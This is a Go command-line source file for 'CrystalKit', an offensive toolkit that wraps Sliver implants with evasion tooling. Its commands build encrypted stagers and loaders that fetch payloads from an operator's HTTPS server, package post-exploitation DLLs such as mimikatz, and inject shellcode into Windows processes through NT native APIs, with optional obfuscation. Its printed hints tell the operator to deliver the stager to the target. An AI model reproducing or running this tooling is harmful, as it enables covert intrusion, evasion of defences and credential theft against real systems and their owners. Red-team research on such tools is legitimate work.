package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
	"crystalkit/internal/crystal"
	"crystalkit/internal/stage"
)

var rootCmd = &cobra.Command{
	Use:   "crystalkit",
	Short: "Crystal Palace + Sliver operator toolkit (Go edition)",
	Long: `CrystalKit wraps Sliver implants with Crystal Palace evasion and
manages post-execution. It is a Go rebuild of CrystalSliver — same
functionality, same Sliver integration, no bash or Python required.

Three use cases (same as the Cobalt Strike Crystal Kit):

  1. Initial access   crystalkit implant → crystalkit stage --serve
  2. Post-execution   crystalkit postex  → crystal payload=<pico>|<args>
  3. Shell execution  crystal-exec --cmd "whoami /all"`,
}

// ── command declarations ──────────────────────────────────────────────────

var implantCmd = &cobra.Command{
	Use:   "implant",
	Short: "Wrap a Sliver DLL with Crystal Palace (initial access PICO)",
	Example: `  crystalkit implant --dll beacon.dll --output build/
  crystalkit implant --profile corp-http --output build/`,
	RunE: runImplant,
}

var stageCmd = &cobra.Command{
	Use:   "stage",
	Short: "Encrypt a PICO and build a Go stager (HTTP fetch, ChaCha20-Poly1305)",
	Example: `  crystalkit stage --pico build/implant.bin --url https://192.168.1.10:8443/abc
  crystalkit stage --pico build/implant.bin --url https://192.168.1.10:8443/abc --serve`,
	RunE: runStage,
}

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Serve an encrypted payload once over HTTPS then shut down",
	Example: `  crystalkit serve --payload build/payload.enc --port 8443`,
	RunE: runServe,
}

var postexCmd = &cobra.Command{
	Use:   "postex",
	Short: "Wrap a post-execution DLL with Crystal Palace postex-loader",
	Example: `  crystalkit postex --dll mimikatz.dll --output build/
  crystalkit postex --dll recon.dll --args "enum_domain" --output build/`,
	RunE: runPostex,
}

var buildExtCmd = &cobra.Command{
	Use:   "build-ext",
	Short: "Build crystal-loader.x64.dll and crystal-exec.x64.dll",
	Long: `Builds both Sliver Extension DLLs:

  crystal-loader.x64.dll  — loads any Crystal Palace PICO from a file path
  crystal-exec.x64.dll    — runs shell commands through an embedded PICO

crystal-exec build pipeline (4 steps):
  1. Compile c/crystal-exec/crystalexec.dll  (CRT-free cmd runner)
  2. Wrap with Crystal Palace postex-loader  → crystalexec.pico.bin
  3. XOR-encrypt PICO → C header             → crystalexec_pico.h
  4. Compile crystal-exec.x64.dll with embedded PICO`,
	RunE: runBuildExt,
}

var bundleCmd = &cobra.Command{
	Use:   "bundle",
	Short: "Package extension DLLs into a Sliver extension tarball",
	Example: `  crystalkit bundle --output build/crystal-loader-0.1.0.tar.gz`,
	RunE: runBundle,
}

var genPicoHeaderCmd = &cobra.Command{
	Use:   "gen-pico-header",
	Short: "XOR-encrypt a PICO binary into a C header (port of gen_pico_header.py)",
	Example: `  crystalkit gen-pico-header --input crystalexec.pico.bin --output crystalexec_pico.h`,
	RunE: runGenPicoHeader,
}

var injectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Build a Go process injector for Sliver shellcode (no Crystal Palace needed)",
	Long: `Encrypts a Sliver shellcode payload and cross-compiles a Go process injector
(loader.exe) that fetches, decrypts, and injects it into a host process using
NT native APIs — no Win32 VirtualAlloc/CreateThread fingerprint, never RWX.

Use Sliver's shellcode format to avoid two-Go-runtime conflicts:

  sliver> generate --format shellcode --os windows --arch amd64 --save /tmp/beacon.bin

Injection chain:
  1. Fetch ciphertext over HTTPS (one-time server, self-signed cert)
  2. ChaCha20-Poly1305 decrypt (AEAD — silently exits on tamper)
  3. Find host: RuntimeBroker → SgrmBroker → WerFault → dllhost → spawn notepad
  4. NtAllocateVirtualMemory(host, RW) → NtWriteVirtualMemory
  5. NtProtectVirtualMemory(host, RX) → NtCreateThreadEx(host)`,
	Example: `  crystalkit inject --shellcode /tmp/beacon.bin --url https://192.168.1.10:8443/p --serve
  crystalkit inject --shellcode /tmp/beacon.bin --url https://192.168.1.10:8443/p --garble -o build/`,
	RunE: runInject,
}

// ── flags ─────────────────────────────────────────────────────────────────

var (
	implantDLL     string
	implantProfile string
	implantOutput  string
	implantEnv     string
)

var (
	stagePICO   string
	stageURL    string
	stageOutput string
	stageServe  bool
	stagePort   int
	stageGarble bool
)

var (
	servePayload string
	servePort    int
)

var (
	postexDLL    string
	postexArgs   string
	postexOutput string
	postexEnv    string
)

var (
	buildExtOutput string
	buildExtEnv    string
)

var (
	bundleOutput string
	bundleEnv    string
)

var (
	picoHeaderInput  string
	picoHeaderOutput string
)

var (
	injectShellcodePath string
	injectURL           string
	injectOutput        string
	injectServe         bool
	injectPort          int
	injectGarble        bool
)

func init() {
	// implant
	implantCmd.Flags().StringVar(&implantDLL, "dll", "", "path to existing Sliver DLL")
	implantCmd.Flags().StringVar(&implantProfile, "profile", "", "Sliver implant profile name")
	implantCmd.Flags().StringVarP(&implantOutput, "output", "o", "build", "output directory")
	implantCmd.Flags().StringVar(&implantEnv, "env", ".crystalenv", "Crystal Palace env file")
	implantCmd.MarkFlagsMutuallyExclusive("dll", "profile")

	// stage
	stageCmd.Flags().StringVar(&stagePICO, "pico", "", "path to Crystal Palace PICO binary (required)")
	stageCmd.Flags().StringVar(&stageURL, "url", "", "HTTPS URL the stager will fetch the payload from (required)")
	stageCmd.Flags().StringVarP(&stageOutput, "output", "o", "build", "output directory")
	stageCmd.Flags().BoolVar(&stageServe, "serve", false, "start one-time HTTPS server after staging")
	stageCmd.Flags().IntVar(&stagePort, "port", 8443, "port for payload server (when --serve)")
	stageCmd.Flags().BoolVar(&stageGarble, "garble", false, "obfuscate stager with garble (requires garble in PATH)")
	_ = stageCmd.MarkFlagRequired("pico")
	_ = stageCmd.MarkFlagRequired("url")

	// serve
	serveCmd.Flags().StringVar(&servePayload, "payload", "", "path to encrypted payload file (required)")
	serveCmd.Flags().IntVar(&servePort, "port", 8443, "port to listen on")
	_ = serveCmd.MarkFlagRequired("payload")

	// postex
	postexCmd.Flags().StringVar(&postexDLL, "dll", "", "path to post-ex DLL (required)")
	postexCmd.Flags().StringVar(&postexArgs, "args", "", "runtime arguments baked into the PICO at wrap time")
	postexCmd.Flags().StringVarP(&postexOutput, "output", "o", "build", "output directory")
	postexCmd.Flags().StringVar(&postexEnv, "env", ".crystalenv", "Crystal Palace env file")
	_ = postexCmd.MarkFlagRequired("dll")

	// build-ext
	buildExtCmd.Flags().StringVarP(&buildExtOutput, "output", "o", "build", "output directory for compiled DLLs")
	buildExtCmd.Flags().StringVar(&buildExtEnv, "env", ".crystalenv", "Crystal Palace env file")

	// bundle
	bundleCmd.Flags().StringVarP(&bundleOutput, "output", "o", "build/crystal-loader-0.1.0.tar.gz", "output tarball")
	bundleCmd.Flags().StringVar(&bundleEnv, "env", ".crystalenv", "Crystal Palace env file")

	// gen-pico-header
	genPicoHeaderCmd.Flags().StringVar(&picoHeaderInput, "input", "", "path to PICO .bin file (required)")
	genPicoHeaderCmd.Flags().StringVar(&picoHeaderOutput, "output", "", "path to output .h file (required)")
	_ = genPicoHeaderCmd.MarkFlagRequired("input")
	_ = genPicoHeaderCmd.MarkFlagRequired("output")

	// inject
	injectCmd.Flags().StringVar(&injectShellcodePath, "shellcode", "", "path to Sliver shellcode binary (.bin, --format shellcode) (required)")
	injectCmd.Flags().StringVar(&injectURL, "url", "", "HTTPS URL the loader will fetch the payload from (required)")
	injectCmd.Flags().StringVarP(&injectOutput, "output", "o", "build", "output directory")
	injectCmd.Flags().BoolVar(&injectServe, "serve", false, "start one-time HTTPS server after building")
	injectCmd.Flags().IntVar(&injectPort, "port", 8443, "port for payload server (when --serve)")
	injectCmd.Flags().BoolVar(&injectGarble, "garble", false, "obfuscate loader with garble (requires garble in PATH)")
	_ = injectCmd.MarkFlagRequired("shellcode")
	_ = injectCmd.MarkFlagRequired("url")

	rootCmd.AddCommand(
		implantCmd,
		stageCmd,
		serveCmd,
		postexCmd,
		buildExtCmd,
		bundleCmd,
		genPicoHeaderCmd,
		injectCmd,
	)
}

// ── handlers ──────────────────────────────────────────────────────────────

func runImplant(_ *cobra.Command, _ []string) error {
	if implantDLL == "" && implantProfile == "" {
		return fmt.Errorf("one of --dll or --profile is required")
	}
	cfg, err := crystal.LoadEnv(implantEnv)
	if err != nil {
		return fmt.Errorf("env: %w", err)
	}
	if err := os.MkdirAll(implantOutput, 0o755); err != nil {
		return err
	}
	out, err := crystal.BuildImplant(cfg, crystal.ImplantOptions{
		DLLPath:     implantDLL,
		ProfileName: implantProfile,
		OutputDir:   implantOutput,
	})
	if err != nil {
		return err
	}
	fmt.Printf("[+] PICO → %s\n", out)
	fmt.Printf("[i] Next: crystalkit stage --pico %s --url https://<operator>:8443/<token> --serve\n", out)
	return nil
}

func runStage(_ *cobra.Command, _ []string) error {
	pico, err := os.ReadFile(stagePICO)
	if err != nil {
		return fmt.Errorf("reading PICO: %w", err)
	}
	if err := os.MkdirAll(stageOutput, 0o755); err != nil {
		return err
	}

	bundle, err := stage.Encrypt(pico)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	payloadPath := fmt.Sprintf("%s/payload.enc", stageOutput)
	if err := os.WriteFile(payloadPath, bundle.Ciphertext, 0o600); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	stagerPath, err := stage.BuildStager(bundle, stageURL, stageOutput, stageGarble)
	if err != nil {
		return fmt.Errorf("building stager: %w", err)
	}

	fmt.Printf("[+] payload  → %s\n", payloadPath)
	fmt.Printf("[+] stager   → %s\n", stagerPath)
	fmt.Printf("[+] url      → %s\n", stageURL)
	fmt.Printf("[i] Deliver stager.exe to the target. Start serve before executing.\n")

	if stageServe {
		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", stagePort)
		srv := stage.NewServer(bundle.Ciphertext, stagePort)
		return srv.ListenAndServe()
	}
	return nil
}

func runServe(_ *cobra.Command, _ []string) error {
	data, err := os.ReadFile(servePayload)
	if err != nil {
		return fmt.Errorf("reading payload: %w", err)
	}
	fmt.Printf("[*] Serving %s on :%d (one download, then shutdown)\n", servePayload, servePort)
	srv := stage.NewServer(data, servePort)
	return srv.ListenAndServe()
}

func runPostex(_ *cobra.Command, _ []string) error {
	cfg, err := crystal.LoadEnv(postexEnv)
	if err != nil {
		return fmt.Errorf("env: %w", err)
	}
	if err := os.MkdirAll(postexOutput, 0o755); err != nil {
		return err
	}
	out, err := crystal.BuildPostex(cfg, crystal.PostexOptions{
		DLLPath:     postexDLL,
		RuntimeArgs: postexArgs,
		OutputDir:   postexOutput,
	})
	if err != nil {
		return err
	}
	fmt.Printf("[+] Post-ex PICO → %s\n", out)
	fmt.Printf("[i] In Sliver: crystal payload=%s\n", out)
	fmt.Printf("[i] With args: crystal payload=%s|<args>\n", out)
	return nil
}

func runBuildExt(_ *cobra.Command, _ []string) error {
	cfg, err := crystal.LoadEnv(buildExtEnv)
	if err != nil {
		return fmt.Errorf("env: %w", err)
	}
	if err := os.MkdirAll(buildExtOutput, 0o755); err != nil {
		return err
	}

	loaderDLL, err := crystal.BuildCrystalLoader(cfg, buildExtOutput)
	if err != nil {
		return fmt.Errorf("crystal-loader: %w", err)
	}
	fmt.Printf("[+] crystal-loader.x64.dll → %s\n", loaderDLL)

	execDLL, err := crystal.BuildCrystalExec(cfg, buildExtOutput)
	if err != nil {
		return fmt.Errorf("crystal-exec: %w", err)
	}
	fmt.Printf("[+] crystal-exec.x64.dll   → %s\n", execDLL)

	fmt.Printf("[i] Next: crystalkit bundle --output build/crystal-loader-0.1.0.tar.gz\n")
	return nil
}

func runBundle(_ *cobra.Command, _ []string) error {
	cfg, err := crystal.LoadEnv(bundleEnv)
	if err != nil {
		return fmt.Errorf("env: %w", err)
	}
	out, err := crystal.PackExtension(cfg, bundleOutput)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Extension tarball → %s\n", out)
	fmt.Printf("[i] In Sliver: extensions install %s\n", out)
	return nil
}

func runGenPicoHeader(_ *cobra.Command, _ []string) error {
	return crystal.GenPicoHeader(picoHeaderInput, picoHeaderOutput)
}

func runInject(_ *cobra.Command, _ []string) error {
	sc, err := os.ReadFile(injectShellcodePath)
	if err != nil {
		return fmt.Errorf("reading shellcode: %w", err)
	}
	if err := os.MkdirAll(injectOutput, 0o755); err != nil {
		return err
	}

	bundle, err := stage.Encrypt(sc)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	payloadPath := fmt.Sprintf("%s/payload.enc", injectOutput)
	if err := os.WriteFile(payloadPath, bundle.Ciphertext, 0o600); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	loaderPath, err := stage.BuildLoader(bundle, injectURL, injectOutput, injectGarble)
	if err != nil {
		return fmt.Errorf("building loader: %w", err)
	}

	fmt.Printf("[+] payload  → %s\n", payloadPath)
	fmt.Printf("[+] loader   → %s\n", loaderPath)
	fmt.Printf("[+] url      → %s\n", injectURL)
	fmt.Printf("[i] loader.exe injects Sliver shellcode into a host process via NT APIs.\n")
	fmt.Printf("[i] Start serve before executing loader.exe on the target.\n")

	if injectServe {
		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", injectPort)
		srv := stage.NewServer(bundle.Ciphertext, injectPort)
		return srv.ListenAndServe()
	}
	return nil
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
